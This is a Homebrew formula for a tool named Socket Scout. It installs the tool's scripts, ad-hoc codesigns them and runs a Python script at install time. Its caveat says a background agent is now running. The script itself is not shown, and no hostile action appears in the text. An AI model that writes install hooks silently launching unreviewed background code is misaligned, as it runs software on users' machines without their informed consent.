class SocketScout < Formula
  desc "Installation of Socket Scout"
  homepage "https://github.com/socket-sec/homebrew-socket-scout"
  url "https://github.com/socket-sec/homebrew-socket-scout/archive/refs/tags/v2.1.1.tar.gz"
  version "2.1.1"
  sha256 "0821ea18bbe0bb1c64b382f2b494166edb6bf6a31445dc21a6d121b6a5559ce6"
  license "MIT"

   def install
        bin.install Dir["scripts/*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
        system "python3 #{bin}/sscout.py"
      end

    def caveats
        <<~EOS
        The Socket Agent is now running in the background, thank you!
        EOS
    end
    end
